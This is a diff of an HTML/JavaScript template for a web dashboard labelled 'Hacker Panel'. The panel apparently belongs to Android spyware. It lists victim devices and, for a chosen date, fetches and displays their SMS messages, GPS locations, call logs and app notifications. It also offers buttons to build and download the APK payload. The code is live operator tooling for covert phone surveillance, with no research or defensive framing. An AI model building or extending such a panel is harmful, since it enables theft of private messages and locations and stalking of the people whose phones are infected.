@@ -16,7 +16,7 @@ body {
 }
 
 .sidebar {
-  min-width: 200px;
+  min-width: 220px;
   background: #111827;
   color: #f9fafb;
   overflow-y: auto;
@@ -30,25 +30,60 @@ body {
   margin-bottom: 15px;
   color: #10b981;
 }
-.sidebar summary {
-  cursor: pointer;
-  padding: 6px 8px;
-  border-radius: 6px;
-  transition: background 0.2s;
-}
-.sidebar summary:hover {
-  background: rgba(16, 185, 129, 0.2);
-}
-.sidebar a {
-  display: block;
-  padding: 5px 10px;
+.device-item {
+  padding: 8px 10px;
   color: #38bdf8;
-  text-decoration: none;
+  cursor: pointer;
   border-radius: 4px;
   transition: background 0.2s;
+  margin-bottom: 4px;
 }
-.sidebar a:hover {
+.device-item:hover {
   background: rgba(56, 189, 248, 0.15);
+}
+.device-item.active {
+  background: rgba(56, 189, 248, 0.25);
+  color: #22d3ee;
+}
+
+.date-section {
+  margin-top: 16px;
+  padding-top: 12px;
+  border-top: 1px solid #1f2937;
+}
+.date-section label {
+  display: block;
+  color: #9ca3af;
+  font-size: 0.85rem;
+  margin-bottom: 6px;
+}
+.date-section select {
+  width: 100%;
+  padding: 8px;
+  border-radius: 6px;
+  border: 1px solid #374151;
+  background: #0f172a;
+  color: #e5e7eb;
+  font-family: monospace;
+  margin-bottom: 8px;
+}
+.date-section button {
+  width: 100%;
+  padding: 8px;
+  border: none;
+  border-radius: 6px;
+  background: #2563eb;
+  color: #fff;
+  cursor: pointer;
+  font-weight: bold;
+}
+.date-section button:hover:not(:disabled) {
+  background: #1e40af;
+}
+.date-section button:disabled {
+  background: #374151;
+  color: #9ca3af;
+  cursor: not-allowed;
 }
 
 .main {
@@ -101,12 +136,6 @@ body {
 .ig-btn:hover { background: #a50e3c !important; }
 .gm-btn { background: #d93025 !important; }
 .gm-btn:hover { background: #a52714 !important; }
-
-.modal-content {
-  background: #1f2937;
-  color: #e5e7eb;
-  border: 1px solid #374151;
-}
 
 .spinner {
   border: 4px solid #1f2937;
@@ -165,59 +194,19 @@ body {
 <body>
   <div class="sidebar" id="sidebar">
     <h2>🤡 Hacker Panel</h2>
-    {% block sidebar %}
-    <ul>
-      {% for device, years in structure.items()|reverse %}
-      <li>
-        <details>
-          <summary>📱 {{ device }}</summary>
-          <ul>
-            {% for year, months in years.items()|reverse %}
-            <li>
-              <details>
-                <summary>{{ year }}</summary>
-                <ul>
-                  {% for month, days in months.items()|reverse %}
-                  <li>
-                    <details>
-                      <summary>{{ month }}</summary>
-                      <ul>
-                        {% for day, files in days.items()|reverse %}
-                        <li>
-                          <details>
-                            <summary>{{ day }}</summary>
-                            <ul>
-                              {% for file in files|reverse %}
-                              <li>
-                                <a class="view-trigger"
-                                  onclick="loadToBoard('{{ url_for('logs', filename=device ~ '/' ~ year ~ '/' ~ month ~ '/' ~ day ~ '/' ~ file) }}', '{{ file }}')">
-                                  📄 {{ file.replace('.json', '') }}
-                                </a>
-                              </li>
-                              {% endfor %}
-                            </ul>
-                          </details>
-                        </li>
-                        {% endfor %}
-                      </ul>
-                    </details>
-                  </li>
-                  {% endfor %}
-                </ul>
-              </details>
-            </li>
-            {% endfor %}
-          </ul>
-        </details>
-      </li>
-      {% endfor %}
-    </ul>
+    <div id="device-list"></div>
+    <div class="date-section" id="date-section" style="display:none;">
+      <label for="date-select">Select date:</label>
+      <select id="date-select">
+        <option value="">-- choose date --</option>
+      </select>
+      <button id="apply-date-btn" disabled>Apply</button>
+    </div>
     {% if not unauthorized %}
     <button id="build-apk-btn" class="apk-build">Build APK</button>
     <a id="download-apk-link" class="apk-download" href="/download_apk">Download APK</a>
     <p id="build-status" style="color: #9ca3af; font-size: 0.85rem; margin-top: 8px;"></p>
     {% endif %}
-    {% endblock %}
   </div>
 
   <div class="main">
@@ -230,21 +219,8 @@ body {
       <p id="login-error" style="color: #ef4444; margin-top: 10px; display: none;"></p>
     </div>
     {% else %}
-    {% block content %}{% endblock %}
-
-    <h2>Popular apps</h2>
-    <div class="filter-buttons">
-      <button class="gm-btn" onclick="filterNotifications('com.google.android.gm')">Gmail</button>
-      <button onclick="filterNotifications('com.facebook.katana')">Facebook</button>
-      <button class="wa-btn" onclick="filterNotifications('com.whatsapp')">WhatsApp</button>
-      <button onclick="filterNotifications('com.facebook.lite')">Facebook Lite</button>
-      <button class="ig-btn" onclick="filterNotifications('com.instagram.android')">Instagram</button>
-      <button class="x-btn" onclick="filterNotifications('com.twitter.android')">X (Twitter)</button>
-    </div>
-    <hr>
-
     <div id="board-content" class="board-content">
-      <p>Select a log from the sidebar to view its details here.</p>
+      <p>Select a device from the sidebar to view its logs.</p>
     </div>
     {% endif %}
   </div>
@@ -277,7 +253,196 @@ body {
     });
   </script>
   {% endif %}
-  <script src="{{ url_for('static', filename='script.js') }}"></script>
+  <script>
+    const structure = {{ structure | tojson }};
+    const deviceListEl = document.getElementById("device-list");
+    const dateSection = document.getElementById("date-section");
+    const dateSelect = document.getElementById("date-select");
+    const applyDateBtn = document.getElementById("apply-date-btn");
+    const boardContent = document.getElementById("board-content");
+
+    let selectedDevice = null;
+
+    function renderDevices() {
+      deviceListEl.innerHTML = "";
+      Object.keys(structure).forEach(device => {
+        const div = document.createElement("div");
+        div.className = "device-item";
+        div.textContent = device;
+        div.addEventListener("click", () => selectDevice(device, div));
+        deviceListEl.appendChild(div);
+      });
+    }
+
+    function selectDevice(device, el) {
+      selectedDevice = device;
+      document.querySelectorAll(".device-item").forEach(item => item.classList.remove("active"));
+      el.classList.add("active");
+      dateSection.style.display = "block";
+      dateSelect.innerHTML = '<option value="">-- loading dates --</option>';
+      applyDateBtn.disabled = true;
+      fetch(`/api/devices/${encodeURIComponent(device)}/dates`)
+        .then(res => res.json())
+        .then(data => {
+          dateSelect.innerHTML = '<option value="">-- choose date --</option>';
+          if (data.dates && data.dates.length) {
+            data.dates.forEach(date => {
+              const option = document.createElement("option");
+              option.value = date;
+              option.textContent = date;
+              dateSelect.appendChild(option);
+            });
+          } else {
+            dateSelect.innerHTML = '<option value="">-- no dates --</option>';
+          }
+        })
+        .catch(() => {
+          dateSelect.innerHTML = '<option value="">-- error loading --</option>';
+        });
+    }
+
+    applyDateBtn.addEventListener("click", () => {
+      const date = dateSelect.value;
+      if (!date || !selectedDevice) return;
+      applyDateBtn.disabled = true;
+      applyDateBtn.textContent = "Loading...";
+      boardContent.innerHTML = "";
+      const startTs = Math.floor(new Date(date + "T00:00:00Z").getTime() / 1000);
+      const endTs = startTs + 86400;
+      const types = ["sms", "gps", "calls", "notifs"];
+      let loaded = 0;
+      const results = {};
+      function checkDone() {
+        loaded++;
+        if (loaded === types.length) {
+          renderResults(results);
+          applyDateBtn.disabled = false;
+          applyDateBtn.textContent = "Apply";
+        }
+      }
+      types.forEach(type => {
+        fetch(`/get_info/${type}?min_timestamp=${startTs}&max_timestamp=${endTs}`, {
+          headers: { "C-Device": selectedDevice }
+        })
+        .then(res => res.json())
+        .then(data => {
+          results[type] = data.data || [];
+          checkDone();
+        })
+        .catch(() => {
+          results[type] = [];
+          checkDone();
+        });
+      });
+    });
+
+    dateSelect.addEventListener("change", () => {
+      applyDateBtn.disabled = !dateSelect.value;
+    });
+
+    function renderResults(results) {
+      boardContent.innerHTML = "";
+      const sections = [
+        { key: "sms", title: "SMS", icon: "📱" },
+        { key: "gps", title: "GPS", icon: "📍" },
+        { key: "calls", title: "Calls", icon: "📞" },
+        { key: "notifs", title: "Notifications", icon: "🔔" }
+      ];
+      sections.forEach(sec => {
+        const items = results[sec.key] || [];
+        const header = document.createElement("h3");
+        header.textContent = `${sec.icon} ${sec.title} (${items.length})`;
+        boardContent.appendChild(header);
+        if (!items.length) {
+          const p = document.createElement("p");
+          p.textContent = "No records found.";
+          p.style.color = "#6b7280";
+          boardContent.appendChild(p);
+          return;
+        }
+        items.forEach(item => {
+          const div = document.createElement("div");
+          div.style.marginBottom = "12px";
+          div.style.padding = "10px";
+          div.style.background = "#1f2937";
+          div.style.borderRadius = "8px";
+          if (sec.key === "sms") {
+            div.innerHTML = `<p><strong>Address:</strong> ${item.address || "Unknown"}</p><p><strong>Body:</strong> ${item.body}</p><p><strong>Date:</strong> ${new Date(item.date).toLocaleString()}</p>`;
+          } else if (sec.key === "gps") {
+            div.innerHTML = `<p><strong>Latitude:</strong> ${item.latitude}</p><p><strong>Longitude:</strong> ${item.longitude}</p><p><strong>Timestamp:</strong> ${new Date(item.timestamp).toLocaleString()}</p>`;
+          } else if (sec.key === "calls") {
+            div.innerHTML = `<p><strong>Number:</strong> ${item.number}</p><p><strong>Type:</strong> ${item.call_type}</p><p><strong>Duration:</strong> ${item.duration}s</p><p><strong>Timestamp:</strong> ${new Date(item.timestamp).toLocaleString()}</p>`;
+          } else if (sec.key === "notifs") {
+            div.innerHTML = `<p><strong>Package:</strong> ${item.package}</p><p><strong>Title:</strong> ${item.title || "(no title)"}</p><p><strong>Text:</strong> ${item.text || "(empty)"}</p><p><strong>Timestamp:</strong> ${new Date(item.timestamp).toLocaleString()}</p>`;
+          }
+          boardContent.appendChild(div);
+        });
+      });
+    }
+
+    renderDevices();
+  </script>
+  {% if not unauthorized %}
+  <script>
+    document.getElementById("build-apk-btn").addEventListener("click", function () {
+      const btn = document.getElementById("build-apk-btn");
+      btn.disabled = true;
+      btn.textContent = "Starting build...";
+      fetch("/build_apk", { method: "POST" })
+        .then((res) => res.json())
+        .then((data) => {
+          if (data.status === "building") {
+            btn.textContent = "Building...";
+          } else {
+            btn.disabled = false;
+            btn.textContent = "Build APK";
+          }
+        })
+        .catch(() => {
+          btn.disabled = false;
+          btn.textContent = "Build APK";
+        });
+    });
+    setInterval(() => {
+      fetch("/build_status")
+        .then(res => res.json())
+        .then(data => {
+          const btn = document.getElementById("build-apk-btn");
+          const link = document.getElementById("download-apk-link");
+          const status = document.getElementById("build-status");
+          if (data.status === "building") {
+            btn.disabled = true;
+            btn.textContent = "Building...";
+            link.style.pointerEvents = "none";
+            link.style.opacity = "0.5";
+            status.textContent = "Building APK, please wait...";
+            status.style.color = "#facc15";
+          } else if (data.status === "error") {
+            btn.disabled = false;
+            btn.textContent = "Build APK";
+            link.style.pointerEvents = "auto";
+            link.style.opacity = "1";
+            status.textContent = "Build failed: " + (data.error || "unknown error");
+            status.style.color = "#ef4444";
+          } else if (data.apk_exists) {
+            btn.disabled = false;
+            btn.textContent = "Build APK";
+            link.style.pointerEvents = "auto";
+            link.style.opacity = "1";
+            status.textContent = "APK ready for download.";
+            status.style.color = "#10b981";
+          } else {
+            btn.disabled = false;
+            btn.textContent = "Build APK";
+            link.style.pointerEvents = "none";
+            link.style.opacity = "0.5";
+            status.textContent = "APK not built yet.";
+            status.style.color = "#9ca3af";
+          }
+        });
+    }, 2000);
+  </script>
+  {% endif %}
 </body>
 
 </html>
